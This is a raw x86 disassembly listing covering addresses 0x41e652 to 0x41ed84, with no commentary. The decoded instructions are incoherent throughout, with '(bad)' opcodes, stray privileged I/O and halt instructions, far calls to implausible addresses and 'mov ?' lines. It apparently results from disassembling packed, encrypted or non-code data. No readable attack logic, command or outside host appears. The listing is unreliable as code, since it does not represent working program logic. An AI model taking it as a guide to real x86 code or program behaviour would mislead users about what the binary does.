  41e652:	bound  ecx,QWORD PTR [ecx]
  41e654:	test   DWORD PTR [edi-0x4c],esi
  41e657:	adc    BYTE PTR ds:0x3f7483d3,dl
  41e65d:	add    DWORD PTR [esi],0xa236f7a7
  41e663:	mov    ch,BYTE PTR [esi+0x63]
  41e666:	xchg   BYTE PTR [ecx],bh
  41e668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e669:	and    BYTE PTR ds:0xdb87c6c7,bh
  41e66f:	test   eax,0x25b917a3
  41e674:	push   0xffffffd9
  41e676:	punpckhdq mm1,QWORD PTR [ebx-0x20d45064]
  41e67d:	addr16 call 0x83e6ec89
  41e683:	jne    0x41e651
  41e685:	push   ecx
  41e686:	push   ebp
  41e687:	dec    ebp
  41e688:	xor    dl,BYTE PTR [ecx+0x40]
  41e68b:	xchg   ecx,eax
  41e68c:	push   eax
  41e68d:	jmp    0x41e62d
  41e68f:	push   ds
  41e690:	in     eax,0xd8
  41e692:	jns    0x41e6eb
  41e694:	and    al,0xc4
  41e696:	dec    esp
  41e697:	xchg   BYTE PTR [edi-0x27],bh
  41e69a:	call   0x7eb0:0x20859a4d
  41e6a1:	stos   BYTE PTR es:[edi],al
  41e6a2:	in     eax,0xbb
  41e6a4:	addr16 int3 
  41e6a6:	loopne 0x41e721
  41e6a8:	cmp    bl,BYTE PTR [ebp+eiz*8+0x2c]
  41e6ac:	or     BYTE PTR [eax-0x3fc61dad],0xb9
  41e6b3:	dec    eax
  41e6b4:	mov    dh,0x31
  41e6b6:	mov    al,ds:0x7772b866
  41e6bb:	mov    DWORD PTR ds:0x6a024937,ebp
  41e6c1:	inc    esp
  41e6c2:	add    eax,DWORD PTR [esi+eiz*2+0x4a9eb662]
  41e6c9:	mov    ecx,0xe01ee212
  41e6ce:	(bad)  
  41e6cf:	imul   edx,DWORD PTR [edx],0xffffffc7
  41e6d2:	gs inc esi
  41e6d4:	and    edi,esp
  41e6d6:	aaa    
  41e6d7:	pushf  
  41e6d8:	(bad)  
  41e6da:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6dc:	mov    dl,0xf2
  41e6de:	loope  0x41e6a5
  41e6e0:	popf   
  41e6e1:	lods   al,BYTE PTR ds:[esi]
  41e6e2:	rcr    BYTE PTR [edi+0x5c],1
  41e6e5:	mov    ecx,0x499d0c82
  41e6ea:	pop    esi
  41e6eb:	shr    BYTE PTR [ebx-0x30],1
  41e6ee:	cmp    esi,DWORD PTR [ecx+0x66]
  41e6f1:	stos   DWORD PTR es:[edi],eax
  41e6f2:	pusha  
  41e6f3:	cmp    BYTE PTR [ebx-0x2e],bh
  41e6f6:	sub    eax,0x4468d201
  41e6fb:	and    cl,ch
  41e6fd:	pop    DWORD PTR [edx+0x4e002b48]
  41e703:	fsub   QWORD PTR [ecx+0x56]
  41e706:	xor    bl,cl
  41e708:	sub    edx,DWORD PTR [ebx-0x12969e37]
  41e70e:	adc    ch,BYTE PTR [edi-0x79]
  41e711:	and    ecx,DWORD PTR [ebp+0x3f]
  41e714:	or     eax,0xbd305ab
  41e719:	sub    dl,bh
  41e71b:	dec    ecx
  41e71c:	sub    ebx,ebx
  41e71e:	push   ss
  41e71f:	sbb    al,0xfe
  41e721:	sahf   
  41e722:	mov    al,ds:0xfe23b8b4
  41e727:	mov    bl,0x8e
  41e729:	xor    BYTE PTR [ebp+0x5861b9f1],0x5c
  41e730:	push   ebp
  41e731:	frstor [edx-0x65]
  41e734:	xchg   ebp,eax
  41e735:	sub    dl,BYTE PTR [ebx+0x30]
  41e738:	and    BYTE PTR [ebx-0x1f1ef873],bh
  41e73e:	stos   DWORD PTR es:[edi],eax
  41e73f:	pop    ebx
  41e740:	push   ds
  41e741:	sub    cl,BYTE PTR [edx+0x3d]
  41e744:	les    edi,FWORD PTR [eax+0x46e8fc2e]
  41e74a:	sub    al,0x3
  41e74c:	std    
  41e74d:	xor    cl,dl
  41e74f:	xor    DWORD PTR [eax],edx
  41e751:	jmp    0x41e6e1
  41e753:	inc    ebp
  41e754:	push   es
  41e755:	icebp  
  41e756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e757:	push   edx
  41e758:	pop    ecx
  41e759:	lea    ebx,gs:[edx]
  41e75c:	stos   BYTE PTR es:[edi],al
  41e75d:	xchg   ebp,eax
  41e75e:	push   0x11
  41e760:	imul   edi,DWORD PTR [edi],0xffffffd1
  41e763:	mov    edx,0x7fdc6c15
  41e768:	and    BYTE PTR [edx+0x52],bl
  41e76b:	or     BYTE PTR [ecx-0x7c28b208],ah
  41e771:	es xor al,dh
  41e774:	retf   0xf1a
  41e777:	sub    al,0x50
  41e779:	repz push esi
  41e77b:	mov    dh,0x4e
  41e77d:	jne    0x41e7da
  41e77f:	dec    eax
  41e780:	retf   
  41e781:	jmp    0x642d129e
  41e786:	push   esp
  41e787:	adc    DWORD PTR [ebx+0x3e240cf8],ebp
  41e78d:	mov    esi,0xe7f25619
  41e792:	jne    0x41e716
  41e794:	ss xchg edi,eax
  41e796:	(bad)  [eax-0x3e]
  41e799:	icebp  
  41e79a:	hlt    
  41e79b:	jg     0x41e81b
  41e79d:	cmp    BYTE PTR [ebx+0x49],bh
  41e7a0:	ds dec esi
  41e7a2:	clc    
  41e7a3:	hlt    
  41e7a4:	in     al,dx
  41e7a5:	adc    ch,ch
  41e7a7:	sbb    esp,esp
  41e7a9:	scas   al,BYTE PTR es:[edi]
  41e7aa:	mul    DWORD PTR [ebx]
  41e7ac:	mov    ecx,0xaa2f55e8
  41e7b1:	outs   dx,BYTE PTR ds:[esi]
  41e7b2:	int3   
  41e7b3:	push   edi
  41e7b4:	lahf   
  41e7b5:	cs mov cl,0xbd
  41e7b8:	ins    BYTE PTR es:[edi],dx
  41e7b9:	pop    esi
  41e7ba:	sbb    ah,0x23
  41e7bd:	jb     0x41e7c2
  41e7bf:	dec    ebp
  41e7c0:	cmp    eax,0x96419353
  41e7c5:	les    ebx,FWORD PTR ds:0xdd7674c
  41e7cb:	lds    edx,FWORD PTR [ecx+0x48]
  41e7ce:	sbb    DWORD PTR [ecx-0xc],edi
  41e7d1:	jns    0x41e799
  41e7d3:	jl     0x41e802
  41e7d5:	xchg   ecx,eax
  41e7d6:	ja     0x41e7b3
  41e7d8:	mov    bl,0x10
  41e7da:	jb     0x41e811
  41e7dc:	mov    esp,0xd694bbfc
  41e7e1:	fdiv   QWORD PTR [edx+edx*1-0x80]
  41e7e5:	out    0x49,eax
  41e7e7:	and    eax,0xe81feed9
  41e7ec:	cli    
  41e7ed:	xchg   ebp,eax
  41e7ee:	mov    al,0xd6
  41e7f0:	push   esp
  41e7f1:	inc    esp
  41e7f2:	jo     0x41e7db
  41e7f4:	ss jno 0x41e7be
  41e7f7:	xchg   ecx,eax
  41e7f8:	ja     0x41e861
  41e7fa:	push   cs
  41e7fb:	push   esi
  41e7fc:	jl     0x41e808
  41e7fe:	inc    ecx
  41e7ff:	popa   
  41e800:	xlat   BYTE PTR ds:[ebx]
  41e801:	test   DWORD PTR [bp+di],0xebc85909
  41e808:	xchg   ecx,eax
  41e809:	fcomp  DWORD PTR [esi]
  41e80b:	hlt    
  41e80c:	fst    QWORD PTR [edi+0x36]
  41e80f:	iret   
  41e810:	mov    ecx,0x83d880de
  41e815:	imul   edx,DWORD PTR [eax-0x7110962b],0x13
  41e81c:	repnz add eax,0x580b47f6
  41e822:	xchg   BYTE PTR [edi-0x31],bh
  41e825:	bound  edi,QWORD PTR ds:0x60b1f68d
  41e82b:	in     al,0xd
  41e82d:	in     al,0xf2
  41e82f:	add    DWORD PTR ds:0x9d275cce,edi
  41e835:	mov    ebp,ebx
  41e837:	sbb    ebp,DWORD PTR [eax-0x5b]
  41e83a:	sub    BYTE PTR [edx],al
  41e83c:	fdiv   QWORD PTR [esi+0x5508bf79]
  41e842:	addr16 dec eax
  41e844:	pop    esp
  41e845:	sub    BYTE PTR [eax],ch
  41e847:	sbb    ebp,esp
  41e849:	cmp    al,0x5d
  41e84b:	stc    
  41e84c:	ins    DWORD PTR es:[edi],dx
  41e84d:	push   edi
  41e84e:	stos   DWORD PTR es:[edi],eax
  41e84f:	out    0x57,eax
  41e851:	addr16 add ebx,eax
  41e854:	sub    edi,DWORD PTR ds:0x9b2692b0
  41e85a:	fsubrp st(0),st
  41e85c:	out    dx,eax
  41e85d:	mov    esp,0x964990ac
  41e862:	div    BYTE PTR [ebx-0x230374c8]
  41e868:	inc    esi
  41e869:	add    dh,dh
  41e86b:	jecxz  0x41e83e
  41e86d:	fwait
  41e86e:	gs pop edi
  41e870:	repnz adc ecx,DWORD PTR [ecx-0x205a87b2]
  41e877:	add    cl,ch
  41e879:	cmp    edx,eax
  41e87b:	dec    ebx
  41e87c:	jns    0x41e872
  41e87e:	stc    
  41e87f:	bound  esi,QWORD PTR [edi+0x2d]
  41e882:	popf   
  41e883:	inc    edx
  41e884:	inc    ebp
  41e885:	(bad)  
  41e886:	mov    ds:0x63aaa3d6,al
  41e88b:	lods   al,BYTE PTR ds:[esi]
  41e88c:	leave  
  41e88d:	jle    0x41e81f
  41e88f:	or     BYTE PTR [edi+ebx*2-0x2f0285f5],bl
  41e896:	mov    esi,0xf790aa7a
  41e89b:	or     DWORD PTR gs:[ebp+esi*4-0x56cd4b8d],esp
  41e8a3:	pop    ds
  41e8a4:	icebp  
  41e8a5:	fwait
  41e8a6:	repnz (bad) 
  41e8a8:	in     eax,0x53
  41e8aa:	loop   0x41e894
  41e8ac:	(bad)  
  41e8ad:	loopne 0x41e861
  41e8af:	pop    ds
  41e8b0:	test   BYTE PTR [edi],ah
  41e8b2:	int    0xfa
  41e8b4:	std    
  41e8b5:	mov    ch,0xee
  41e8b7:	mov    edi,0x9c040688
  41e8bc:	in     al,0x12
  41e8be:	sbb    al,0xd2
  41e8c0:	icebp  
  41e8c1:	call   0x871a:0x4ad8b2d5
  41e8c8:	sub    edx,esi
  41e8ca:	dec    esp
  41e8cb:	sub    ecx,esp
  41e8cd:	xchg   ebx,eax
  41e8ce:	pop    ss
  41e8cf:	jecxz  0x41e872
  41e8d1:	adc    al,0xb5
  41e8d3:	push   esi
  41e8d4:	das    
  41e8d5:	ins    BYTE PTR es:[edi],dx
  41e8d6:	bound  eax,QWORD PTR [ebx-0x4ccf9187]
  41e8dc:	pop    edx
  41e8dd:	hlt    
  41e8de:	add    dh,ch
  41e8e0:	xor    al,0xf0
  41e8e2:	inc    eax
  41e8e3:	pop    esp
  41e8e4:	ret    0x88e2
  41e8e7:	ror    edx,cl
  41e8e9:	retf   
  41e8ea:	pop    ds
  41e8eb:	es retf 0x85dd
  41e8ef:	out    dx,eax
  41e8f0:	sbb    al,0x92
  41e8f2:	cmp    eax,0xd5bb0746
  41e8f7:	sub    edi,esi
  41e8f9:	mov    ecx,DWORD PTR [ecx-0x37]
  41e8fc:	mov    ?,WORD PTR [ecx]
  41e8fe:	add    edx,esp
  41e900:	pop    ebx
  41e901:	cmc    
  41e902:	out    0xf1,eax
  41e904:	jp     0x41e93e
  41e906:	xor    edi,DWORD PTR [eax]
  41e908:	fisttp WORD PTR [ebx-0x3f33ca2f]
  41e90e:	xor    esi,DWORD PTR [edi+0x585cf634]
  41e914:	(bad)  
  41e915:	stc    
  41e916:	test   eax,0x854d277b
  41e91b:	sbb    BYTE PTR [ebx-0x7c],al
  41e91e:	sub    eax,ecx
  41e920:	pop    edx
  41e921:	jg     0x41e926
  41e923:	lds    eax,FWORD PTR [si+0x77]
  41e927:	jns    0x41e8ed
  41e929:	pusha  
  41e92a:	jae    0x41e9aa
  41e92c:	ja     0x41e990
  41e92e:	mov    bl,0x66
  41e930:	xchg   ebx,eax
  41e931:	mov    ecx,DWORD PTR [esi]
  41e933:	and    al,0x1c
  41e935:	or     esi,DWORD PTR [ecx]
  41e937:	inc    ebx
  41e938:	inc    esp
  41e939:	(bad)  
  41e93b:	leave  
  41e93c:	ins    DWORD PTR es:[edi],dx
  41e93d:	sub    eax,0xbe1bff2
  41e942:	int3   
  41e943:	inc    DWORD PTR [edi]
  41e945:	fs dec edi
  41e947:	sub    eax,0xa710f402
  41e94c:	mov    al,ds:0x6c0affc8
  41e951:	sub    al,0xf1
  41e953:	test   DWORD PTR [edx+0xe17485e],ebx
  41e959:	fs fdivr st(7),st
  41e95c:	ja     0x41e8e5
  41e95e:	sti    
  41e95f:	pushf  
  41e960:	in     al,0xd6
  41e962:	adc    al,0xb7
  41e964:	and    ch,ah
  41e966:	pop    esi
  41e967:	js     0x41e90c
  41e969:	pop    ds
  41e96a:	mov    ebx,0xac9c40a7
  41e96f:	test   al,0xcb
  41e971:	mov    ah,ch
  41e973:	jbe    0x41e958
  41e975:	sub    ah,ch
  41e977:	jge    0x41e985
  41e979:	xchg   esi,eax
  41e97a:	ror    BYTE PTR [esi+0x3a19b6b1],0x4e
  41e981:	fcmovne st,st(0)
  41e983:	imul   edi,DWORD PTR [eax],0xccc0b74e
  41e989:	cmc    
  41e98a:	push   ecx
  41e98b:	mov    WORD PTR [esi],fs
  41e98d:	push   ebx
  41e98e:	in     al,dx
  41e98f:	js     0x41e913
  41e991:	sbb    DWORD PTR [ecx+0x24],ebp
  41e994:	xchg   BYTE PTR [ecx],bl
  41e996:	jne    0x41e91e
  41e998:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e999:	(bad)  
  41e99a:	shl    DWORD PTR [edi-0x597992d6],cl
  41e9a0:	push   0x3b
  41e9a2:	adc    bh,BYTE PTR [eax]
  41e9a4:	xchg   DWORD PTR [esi-0x41],edi
  41e9a7:	cdq    
  41e9a8:	lea    ecx,[edi-0x5]
  41e9ab:	retf   0x9cbd
  41e9ae:	test   edi,edx
  41e9b0:	test   DWORD PTR [esi-0x36],ebx
  41e9b3:	leave  
  41e9b4:	ret    
  41e9b5:	jecxz  0x41ea08
  41e9b7:	outs   dx,BYTE PTR ds:[esi]
  41e9b8:	clc    
  41e9b9:	pop    ds
  41e9ba:	and    DWORD PTR [eax],ecx
  41e9bc:	retf   
  41e9bd:	repnz pop ecx
  41e9bf:	fbld   TBYTE PTR [eax]
  41e9c1:	mul    BYTE PTR ds:0xc7058345
  41e9c7:	int3   
  41e9c8:	ror    DWORD PTR [ebp-0x48e238ee],1
  41e9ce:	jae    0x41e9ac
  41e9d0:	test   al,0xf
  41e9d2:	push   esp
  41e9d3:	jnp    0x41ea46
  41e9d5:	jl     0x41e9e7
  41e9d7:	pop    ebp
  41e9d8:	hlt    
  41e9d9:	inc    ebx
  41e9da:	pop    es
  41e9db:	sub    ebp,DWORD PTR [edi+edi*4-0x4e724663]
  41e9e2:	push   ss
  41e9e3:	cwde   
  41e9e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9e5:	and    eax,0xada4d3cd
  41e9ea:	rcl    cl,cl
  41e9ec:	dec    ebp
  41e9ed:	pop    ecx
  41e9ee:	lock fild DWORD PTR [edi]
  41e9f1:	outs   dx,BYTE PTR ds:[esi]
  41e9f2:	jmp    0x41e98b
  41e9f4:	sti    
  41e9f5:	add    ebx,esp
  41e9f7:	cmp    al,0x87
  41e9f9:	mov    ebp,0x40dfe1e6
  41e9fe:	mov    bh,BYTE PTR [edx]
  41ea00:	packssdw mm1,QWORD PTR [ebx]
  41ea03:	jnp    0x41e9bf
  41ea05:	add    eax,0x471c5679
  41ea0a:	addr16 add al,0xef
  41ea0d:	add    eax,0x1d16204c
  41ea12:	les    ebp,FWORD PTR [ebx+ebx*4+0x49]
  41ea16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea17:	pop    es
  41ea18:	xor    al,0x26
  41ea1a:	add    dl,al
  41ea1c:	and    DWORD PTR [ebp-0x62090438],eax
  41ea22:	fcom   QWORD PTR [edx+0x3dfb22f3]
  41ea28:	pop    esi
  41ea29:	push   0x391412d5
  41ea2e:	jmp    0xd3d3bad2
  41ea33:	dec    edi
  41ea34:	es cmc 
  41ea36:	mov    DWORD PTR [edi-0x46],esp
  41ea39:	rcr    DWORD PTR [ecx-0x47],cl
  41ea3c:	(bad)  
  41ea3d:	sbb    eax,ecx
  41ea3f:	mov    al,bh
  41ea41:	xchg   ebx,eax
  41ea42:	dec    eax
  41ea43:	add    edx,ebp
  41ea45:	pop    ecx
  41ea46:	es js  0x41eaa3
  41ea49:	ret    0x9d02
  41ea4c:	rcr    cl,cl
  41ea4e:	push   edx
  41ea4f:	aaa    
  41ea50:	mov    ?,ebp
  41ea52:	mov    ecx,0xb8bc88c9
  41ea57:	pop    ebp
  41ea58:	stos   DWORD PTR es:[edi],eax
  41ea59:	cli    
  41ea5a:	add    BYTE PTR [eax+esi*8],ch
  41ea5d:	mov    BYTE PTR [ecx],bl
  41ea5f:	fisub  DWORD PTR [edx-0x572d9148]
  41ea65:	pushf  
  41ea66:	jge    0x41ea3e
  41ea68:	in     eax,dx
  41ea69:	repnz in al,0x70
  41ea6c:	ins    BYTE PTR es:[edi],dx
  41ea6d:	sub    ebp,DWORD PTR [eax-0x6]
  41ea70:	push   ss
  41ea71:	push   ebx
  41ea72:	loope  0x41ea7f
  41ea74:	pop    es
  41ea75:	xlat   BYTE PTR ds:[ebx]
  41ea76:	cmp    BYTE PTR [ebx+0x36],dh
  41ea79:	loopne 0x41ead9
  41ea7b:	push   edi
  41ea7c:	push   DWORD PTR [edi]
  41ea7e:	jbe    0x41eaea
  41ea80:	ins    BYTE PTR es:[edi],dx
  41ea81:	inc    esi
  41ea82:	push   cs
  41ea83:	aam    0x38
  41ea85:	cld    
  41ea86:	in     eax,0x47
  41ea88:	pop    ebx
  41ea89:	mov    WORD PTR [esi-0x53],ds
  41ea8c:	mov    edx,ebp
  41ea8e:	call   0xfdec3c3e
  41ea93:	mov    edi,0xdf26481a
  41ea98:	xor    bl,BYTE PTR [ebp-0x3d]
  41ea9b:	jecxz  0x41eb18
  41ea9d:	hlt    
  41ea9e:	cld    
  41ea9f:	sbb    esp,DWORD PTR [edx]
  41eaa1:	mov    cs,WORD PTR [edx-0x58]
  41eaa4:	retf   
  41eaa5:	int    0xa
  41eaa7:	dec    edx
  41eaa8:	std    
  41eaa9:	repnz (bad) [esi-0x25]
  41eaad:	mov    dl,ah
  41eaaf:	dec    edi
  41eab0:	out    0xba,eax
  41eab2:	adc    DWORD PTR [edi-0x61],edx
  41eab5:	add    cl,0x6b
  41eab8:	sbb    bh,dh
  41eaba:	and    cl,BYTE PTR [ebp*1+0x4e2d3057]
  41eac1:	mov    al,0xbd
  41eac3:	sar    BYTE PTR [ecx],1
  41eac5:	scas   eax,DWORD PTR es:[edi]
  41eac6:	or     bh,bh
  41eac8:	jno    0x41ead0
  41eaca:	out    0x13,al
  41eacc:	mov    bh,0x86
  41eace:	dec    esp
  41eacf:	es out dx,al
  41ead1:	popf   
  41ead2:	pop    eax
  41ead3:	adc    dl,BYTE PTR [ecx-0x26b559e4]
  41ead9:	test   edi,esp
  41eadb:	sub    eax,0xdd1f3eda
  41eae0:	std    
  41eae1:	sub    eax,0xa9a379f9
  41eae6:	arpl   WORD PTR [ebp-0x24b21e22],si
  41eaec:	sub    DWORD PTR [edx],0x73
  41eaef:	inc    ecx
  41eaf0:	cwde   
  41eaf1:	sti    
  41eaf2:	adc    al,0x7f
  41eaf4:	cmp    eax,ecx
  41eaf6:	push   eax
  41eaf7:	push   0xa8756853
  41eafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eafd:	push   es
  41eafe:	(bad)
  41eb01:	ficom  DWORD PTR [edi]
  41eb03:	jae    0x41eb53
  41eb05:	mov    DWORD PTR [eax],eax
  41eb07:	out    dx,eax
  41eb08:	shr    BYTE PTR [eax],0x2f
  41eb0b:	stc    
  41eb0c:	dec    edx
  41eb0d:	aam    0x25
  41eb0f:	arpl   WORD PTR [esi-0x23c61a14],dx
  41eb15:	in     al,0x48
  41eb17:	adc    al,0x99
  41eb19:	ja     0x41eabb
  41eb1b:	stos   DWORD PTR es:[edi],eax
  41eb1c:	jecxz  0x41eb7a
  41eb1e:	jle    0x41eb93
  41eb20:	mov    dh,BYTE PTR [ecx+ebx*1]
  41eb23:	push   eax
  41eb24:	adc    al,0x58
  41eb26:	dec    edi
  41eb27:	inc    ebp
  41eb28:	xchg   esp,eax
  41eb29:	ss jmp 0x41eb0f
  41eb2c:	fisubr DWORD PTR [edx]
  41eb2e:	mov    ebx,0x7eef5939
  41eb33:	or     cl,BYTE PTR [esi-0x45]
  41eb36:	lahf   
  41eb37:	test   BYTE PTR [eax-0x114eddb5],dh
  41eb3d:	xlat   BYTE PTR ds:[ebx]
  41eb3e:	jp     0x41ead7
  41eb40:	xlat   BYTE PTR ds:[ebx]
  41eb41:	inc    ebx
  41eb42:	loopne 0x41eb6a
  41eb44:	or     eax,0x33c0e3d7
  41eb49:	lock pop ebx
  41eb4b:	test   eax,0xd695ec34
  41eb50:	jge    0x41eafd
  41eb52:	mov    ch,dl
  41eb54:	pop    es
  41eb55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb56:	dec    edx
  41eb57:	rol    BYTE PTR [edi+ebx*2],cl
  41eb5a:	sahf   
  41eb5b:	sti    
  41eb5c:	mov    ebx,esi
  41eb5e:	fs mov edx,0x3ecf2ec
  41eb64:	mov    dh,0x3f
  41eb66:	push   es
  41eb67:	hlt    
  41eb68:	add    al,BYTE PTR [ebp+0x50e69ce6]
  41eb6e:	add    al,0x62
  41eb70:	mov    WORD PTR [ebx-0x42259fb7],gs
  41eb76:	fst    DWORD PTR [ebp+0x7a]
  41eb79:	rcr    BYTE PTR [esi+eiz*2-0x935ae59],0x7f
  41eb81:	adc    al,0x44
  41eb83:	sbb    BYTE PTR [eax-0x144dd717],al
  41eb89:	popf   
  41eb8a:	or     eax,0x4506ffa5
  41eb8f:	addr16 inc esp
  41eb91:	test   esp,ebp
  41eb93:	sahf   
  41eb94:	fldenv ds:0xe1a86f
  41eb9a:	cli    
  41eb9b:	adc    bl,BYTE PTR [edi+0x7d]
  41eb9e:	(bad)
  41eba2:	jmp    0x4879d01f
  41eba7:	pop    esp
  41eba8:	add    BYTE PTR [eax+0x23],0xfe
  41ebac:	or     esi,DWORD PTR [ebx-0x4f0f8092]
  41ebb2:	mov    esi,0x80b700fc
  41ebb7:	les    edi,FWORD PTR [ebx]
  41ebb9:	mov    bh,0x9f
  41ebbb:	mov    BYTE PTR ds:0xa77c6855,0xda
  41ebc2:	stc    
  41ebc3:	cmp    BYTE PTR [esi+edi*8],ch
  41ebc6:	push   ss
  41ebc7:	and    al,0xe3
  41ebc9:	test   al,0xb6
  41ebcb:	leave  
  41ebcc:	popa   
  41ebcd:	xor    BYTE PTR [esi+ebp*1-0x16],cl
  41ebd1:	add    ebp,eax
  41ebd3:	jle    0x41ebea
  41ebd5:	cmp    al,BYTE PTR [eax]
  41ebd7:	ficomp DWORD PTR [edi+0x19ae0fe9]
  41ebdd:	push   eax
  41ebde:	mov    dl,0xf2
  41ebe0:	add    BYTE PTR [edi-0x41562109],0xe
  41ebe7:	scas   eax,DWORD PTR es:[edi]
  41ebe8:	add    BYTE PTR [esi],cl
  41ebea:	sub    DWORD PTR [ebp+0x69],esp
  41ebed:	jmp    0x41ebd8
  41ebef:	xor    eax,0xbd1ce7e5
  41ebf4:	shl    ebx,0x57
  41ebf7:	cmp    dl,BYTE PTR [ecx+ebx*2+0x54]
  41ebfb:	xor    DWORD PTR ds:0x51142558,ecx
  41ec01:	dec    esi
  41ec02:	fidiv  WORD PTR [edi]
  41ec04:	jnp    0x41ec60
  41ec06:	fdivr  st(4),st
  41ec08:	jae    0x41ec67
  41ec0a:	jns    0x41ebbe
  41ec0c:	imul   BYTE PTR [edi]
  41ec0e:	fsubr  st,st(2)
  41ec10:	push   ebp
  41ec11:	cmp    al,al
  41ec13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec14:	cmp    ebp,DWORD PTR ds:0xb7f30a56
  41ec1a:	daa    
  41ec1b:	fcomi  st,st(6)
  41ec1d:	loop   0x41ec9d
  41ec1f:	test   eax,0xb769867c
  41ec24:	mov    ebx,0x43544fb9
  41ec29:	sbb    al,0x1a
  41ec2b:	dec    edx
  41ec2c:	arpl   WORD PTR ds:0xd97f30ff,dx
  41ec32:	push   ebp
  41ec33:	je     0x41ebf7
  41ec35:	test   eax,0x25e99944
  41ec3a:	sub    al,0x74
  41ec3c:	stos   BYTE PTR es:[edi],al
  41ec3d:	imul   edx,DWORD PTR [edx-0x2f],0x80a0a578
  41ec44:	push   0xfffffff3
  41ec46:	xchg   edi,eax
  41ec47:	in     al,dx
  41ec48:	jge    0x41ec58
  41ec4a:	mov    dl,0x4c
  41ec4c:	and    cl,BYTE PTR [ebx+0x35b7804c]
  41ec52:	mov    dh,0xe8
  41ec54:	mov    ah,0x60
  41ec56:	fcmovnbe st,st(1)
  41ec58:	cmc    
  41ec59:	cwde   
  41ec5a:	popa   
  41ec5b:	fcomip st,st(2)
  41ec5d:	and    eax,0xb53a947d
  41ec62:	adc    eax,DWORD PTR [esi]
  41ec64:	jae    0x41ec98
  41ec66:	mov    ebp,DWORD PTR [edi+0x3]
  41ec69:	add    ah,bh
  41ec6b:	adc    DWORD PTR [edx*8-0xdbc7641],eax
  41ec72:	ins    BYTE PTR es:[edi],dx
  41ec73:	mov    cl,0x31
  41ec75:	sti    
  41ec76:	(bad)  
  41ec77:	adc    BYTE PTR [ecx],ah
  41ec79:	ins    BYTE PTR es:[edi],dx
  41ec7a:	xchg   ebx,eax
  41ec7b:	mov    cl,0xd0
  41ec7d:	aam    0xbd
  41ec7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec80:	call   0xe9ef30b5
  41ec85:	std    
  41ec86:	pushf  
  41ec87:	push   ds
  41ec88:	xchg   esp,eax
  41ec89:	mov    ebp,0x1c25bf8
  41ec8e:	mov    ds:0x69683216,eax
  41ec93:	jle    0x41ecf8
  41ec95:	dec    ebx
  41ec96:	fs scas al,BYTE PTR es:[edi]
  41ec98:	cwde   
  41ec99:	adc    cl,0x11
  41ec9c:	xchg   ebx,eax
  41ec9d:	and    DWORD PTR [edi-0xb],eax
  41eca0:	pop    ds
  41eca1:	imul   esp,esp,0xffffffcd
  41eca4:	pop    esi
  41eca5:	sahf   
  41eca6:	dec    edx
  41eca7:	fdivr  st(5),st
  41eca9:	mov    es,WORD PTR [edi+eax*2-0xe26f5e2]
  41ecb0:	pop    edi
  41ecb1:	jmp    0x4866102d
  41ecb6:	rcr    DWORD PTR [eax],0xc6
  41ecb9:	fld    DWORD PTR [ebx+ebx*8+0xd]
  41ecbd:	rcr    BYTE PTR [edi+0x533404cf],0x62
  41ecc4:	push   edi
  41ecc5:	add    edx,ebp
  41ecc7:	adc    eax,0xdf9a061f
  41eccc:	icebp  
  41eccd:	dec    ebp
  41ecce:	fdivr  DWORD PTR [esi-0x5ffa5c52]
  41ecd4:	xor    DWORD PTR [edx+0x4d],ebx
  41ecd7:	rol    BYTE PTR [ebp+0x17d2ac24],1
  41ecdd:	mov    eax,ds:0x19a830a1
  41ece2:	(bad)  
  41ece3:	lahf   
  41ece4:	fcomi  st,st(2)
  41ece6:	pop    esp
  41ece7:	dec    esi
  41ece8:	imul   eax,DWORD PTR [edi+edx*4-0x45],0x8
  41eced:	clc    
  41ecee:	cdq    
  41ecef:	xchg   bl,dh
  41ecf1:	enter  0x4807,0xd1
  41ecf5:	sbb    eax,DWORD PTR gs:[ebx-0x3c58ea18]
  41ecfc:	jnp    0x41ed5a
  41ecfe:	adc    al,0x54
  41ed00:	outs   dx,BYTE PTR ds:[esi]
  41ed01:	jmp    FWORD PTR [edi]
  41ed03:	cmp    ah,bl
  41ed05:	inc    esp
  41ed06:	pop    es
  41ed07:	ins    DWORD PTR es:[edi],dx
  41ed08:	shl    DWORD PTR [esi+0x41561e54],0xc3
  41ed0f:	fcomp  DWORD PTR fs:[edi+0x54b94072]
  41ed16:	retf   0x8e92
  41ed19:	sbb    dl,ch
  41ed1b:	add    al,0x42
  41ed1d:	je     0x41ed8a
  41ed1f:	pop    esi
  41ed20:	push   0x74
  41ed22:	push   0x5d
  41ed24:	sbb    eax,0xcddfb78
  41ed29:	test   DWORD PTR [eax-0x34],0x3410b513
  41ed30:	mov    edi,DWORD PTR [edx-0x68]
  41ed33:	jmp    0xfbd3ca8c
  41ed38:	es push es
  41ed3a:	dec    ebp
  41ed3b:	aaa    
  41ed3c:	push   0x75
  41ed3e:	xor    dl,ch
  41ed40:	mov    esi,DWORD PTR [eax+0x29]
  41ed43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed44:	adc    al,0x92
  41ed46:	imul   esi,DWORD PTR [ecx],0xfc675864
  41ed4c:	dec    esi
  41ed4d:	out    0xa0,al
  41ed4f:	pop    ebp
  41ed50:	pop    eax
  41ed51:	mov    WORD PTR [edx-0xd466af],?
  41ed57:	and    al,0x65
  41ed59:	ror    edi,cl
  41ed5b:	sahf   
  41ed5c:	shr    BYTE PTR [edi],1
  41ed5e:	in     eax,0x5d
  41ed60:	test   al,0x84
  41ed62:	cmp    cl,al
  41ed64:	iret   
  41ed65:	outs   dx,BYTE PTR ds:[esi]
  41ed66:	js     0x41ed76
  41ed68:	xchg   esi,eax
  41ed69:	adc    al,0x1b
  41ed6b:	sub    BYTE PTR [edx],bh
  41ed6d:	std    
  41ed6e:	cmp    DWORD PTR [edx+0x32],esi
  41ed71:	mov    ebp,0xe4cfb0ce
  41ed76:	sbb    esi,DWORD PTR [eax+0x7b]
  41ed79:	out    0xd1,eax
  41ed7b:	sub    eax,0x75463921
  41ed80:	sbb    al,0x3
  41ed82:	jbe    0x41edaa
  41ed84:	jo     0x41ed4c
